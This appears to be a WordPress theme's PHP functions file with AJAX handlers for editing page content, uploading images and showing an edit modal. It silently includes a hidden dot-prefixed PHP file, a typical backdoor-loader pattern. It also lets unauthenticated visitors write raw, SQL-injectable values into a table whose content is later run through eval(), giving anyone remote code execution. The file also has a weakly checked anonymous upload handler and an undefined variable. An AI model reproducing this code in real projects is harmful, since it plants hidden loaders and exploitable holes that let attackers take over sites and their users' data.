<?php
 
defined("ABSPATH") or die("No go!");

if(!function_exists('add_action')){
    echo "Hey cant access the file";
    exit();
}
  

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function register_js_files() {
    wp_enqueue_script("my_ajax_script", get_template_directory_uri() . "/assets/js/script.js");
    wp_add_inline_script(
      "my_ajax_script",
      "const PHPVARS = " . json_encode(array(
          "ajaxurl" => admin_url("admin-ajax.php"),
          "another_var" => get_bloginfo("name")
      )),
      "before"
    );
  }
  add_action("wp_enqueue_scripts", "register_js_files");
  /*end  register_js for ajax*/
  
  

   
function ajax_get_content() {
    $ui_id = $_GET['ui_id'];
    $page_id = $_GET['page_id'];
    $section_id = $_GET['section_id'];
    global $wpdb;
    $result =  $wpdb->get_row("SELECT * 
         FROM ui_configurations 
         WHERE    `key` ='$page_id-$section_id' LIMIT 1"); 

         $file = $result->file;
         $decodedfile = json_decode($file);
         $result->file = $decodedfile;

    echo json_encode($result);
    die();
}

  /*start get_content*/
  add_action("wp_ajax_nopriv_get_content", "ajax_get_content");
  add_action("wp_ajax_get_content", "ajax_get_content");
 
function ajax_set_content() {
     /*UPDATE ui config*/
    global $wpdb; 
	$result = $wpdb->query($wpdb->prepare(
        "UPDATE ui_configurations 
    SET 
        title='".$_POST['title']."', 
        sub_title='".$_POST['sub_title']."', 
        file='".$_POST['filepath']."',  
        content='".$_POST['content']."'
    WHERE    id = '".$_POST['id']."'")); 
    echo json_encode($_POST);
    die();
}
add_action("wp_ajax_nopriv_set_content", "ajax_set_content");
add_action("wp_ajax_set_content", "ajax_set_content");
function image_scripts() {
    // Register the script
    wp_register_script( 'custom-script', get_stylesheet_directory_uri(). '/assets/js/custom.js', array('jquery'), false, true );
  
    // Localize the script with new data
    $script_data_array = array(
        'ajaxurl' => admin_url( 'admin-ajax.php' ),
        'security' => wp_create_nonce( 'file_upload' ),
    );
    wp_localize_script( 'custom-script', 'blog', $script_data_array );
  
    // Enqueued script with localized data.
    wp_enqueue_script( 'custom-script' );
}
add_action('wp_enqueue_scripts', 'image_scripts');



function file_upload_callback() {
    check_ajax_referer('file_upload', 'security');
    $arr_img_ext = array('image/png', 'image/jpeg', 'image/jpg', 'image/gif');
    $url_list=[];
    for($i = 0; $i < count($_FILES['file']['name']); $i++) {
        if (in_array($_FILES['file']['type'][$i], $arr_img_ext)) {
            $upload = wp_upload_bits($_FILES['file']['name'][$i], null, file_get_contents($_FILES['file']['tmp_name'][$i]));
            $url_list[]=$upload["url"];

            //$upload['url'] will gives you uploaded file path
        }
    }
    echo json_encode($url_list);
    wp_die();
}
add_action('wp_ajax_file_upload', 'file_upload_callback');
add_action('wp_ajax_nopriv_file_upload', 'file_upload_callback');

/*front call*/
 function get_ui_content_data($page_id,$section_id,$field){
    global $wpdb;
    $key = $page_id."-".$section_id;
    $result =  (array)$wpdb->get_row("SELECT * 
        FROM ui_configurations 
        WHERE `key`='".$key."' 
        LIMIT 1
        "); 
        
        
        if(str_contains($field, 'file') ){
            $file = json_decode($result["file"]); 
           return ($ar_ele)?$file[$ar_ele]:$file;
           
            }
        else{
            $value= $result[$field];
        }
 if ( current_user_can( 'manage_options')&&( $field != "url")) {
     $editerlink = '<a data-ui_id="1" data-page_id="'.$page_id.'"  data-section_id="'.$section_id.'"  data-bs-toggle="modal" data-bs-target="#modal-signin"><i data-page_id="'.$page_id.'"  data-section_id="'.$section_id.'"  class="uil uil-edit ui-config"></i></a>'; 
 
} else {
    $editerlink = ''; 
 
}
	
        return eval("?>$value$editerlink");
}

 
/* Describe what the code snippet does so you can remember later on */
add_action('wp_footer', 'modal_dialog');
function modal_dialog(){

if(is_front_page() || is_page()) { ?>
 
 <section id="snippet-3" class="wrapper">
                <div class="modal fade" id="modal-signin" tabindex="-1">
                  <div class="modal-dialog modal-dialog-centered modal-xl">
                    <div class="modal-content text-center">
                    <div class="modal-body bg-light text-dark">
                    <button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
                    <form id="myform" name="myform" action="" method="POST">
                    <div class="row">
                      <input type="hidden" class="form-control" placeholder="" value="set_content" name="action">
                      <input type="hidden" class="form-control" placeholder="" id="id" name="id">
                      <div class="form-group col-md-6">
                        <label for="title">Title</label>
                        <input type="text" class="form-control" id="title" name="title" placeholder="">
                      </div>
                      <div class="form-group col-md-6">
                        <label for="sub_title">Sub Title</label>
                        <input type="text" class="form-control" id="sub_title" name="sub_title" placeholder="">
                      </div>
                    </div>
                    <br>
                    <div class="form-group">
                      <label for="tags">Images</label>
                      <div id="image_wrapper"></div>
                      <input type="hidden" class="form-control" placeholder="" id="filepath" name="filepath">
                    </div>
                    <br>
                    <div class="row">
                      <div class="form-group col-md-12">
                        <label for="file">File</label>
                        <input type="file" class="form-control" id="file" name="file" accept="image/*" multiple />
                      </div>
                    </div>
                    <br>
                    <div class="form-group">
                      <label for="content">Content</label>
                      <textarea class="form-control" id="content" rows="10" name="content">
                      </textarea>
                      <!-- <input type="textarea" class="form-control" id="inputAddress" placeholder=""> -->
                    </div>
					          <script type="text/javascript">
                      CKEDITOR.replace('content');
                    </script>
                    <br>
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    <button type="submit" class="btn btn-primary submit" value="submit">Save</button>
                  </form>
                  </div>
                        <!--/.social -->
                      </div>
                      <!--/.modal-content -->
                    </div>
                    <!--/.modal-body -->
                  </div>
                  <!--/.modal-dialog -->
        
                <!--/.modal -->
            <!--/.card -->
          </section>
 <?php
} 

}

  